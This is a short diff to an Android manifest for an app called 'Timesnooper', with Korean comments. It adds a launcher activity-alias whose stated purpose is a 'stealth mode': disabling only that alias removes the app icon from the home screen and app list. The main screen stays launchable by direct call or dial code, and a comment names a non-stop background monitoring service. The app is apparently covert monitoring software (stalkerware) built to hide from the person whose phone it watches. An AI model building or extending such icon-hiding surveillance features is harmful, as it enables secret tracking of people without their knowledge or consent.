@@ -44,17 +44,26 @@
         android:usesCleartextTraffic="true"
         android:theme="@style/Theme.Timesnooper">
 
-        <!-- 메인 설정 화면 (초기 권한 승인 후 런처 아이콘 숨김 처리 지원) -->
+        <!-- 메인 설정 화면 (직접 호출 및 다이얼/리시버 실행 가능) -->
         <activity
             android:name=".ui.MainActivity"
             android:exported="true"
             android:label="Timesnooper"
-            android:theme="@style/Theme.Timesnooper">
+            android:theme="@style/Theme.Timesnooper" />
+
+        <!-- 런처 아이콘 전용 alias: 스텔스 모드 시 이 alias만 비활성화하여 홈/앱스에서 깔끔히 제거 -->
+        <activity-alias
+            android:name=".ui.LauncherAlias"
+            android:targetActivity=".ui.MainActivity"
+            android:enabled="true"
+            android:exported="true"
+            android:icon="@android:drawable/sym_def_app_icon"
+            android:label="Timesnooper">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
-        </activity>
+        </activity-alias>
 
         <!-- 핵심 1: 무중단 백그라운드 모니터링 포그라운드 서비스 -->
         <service
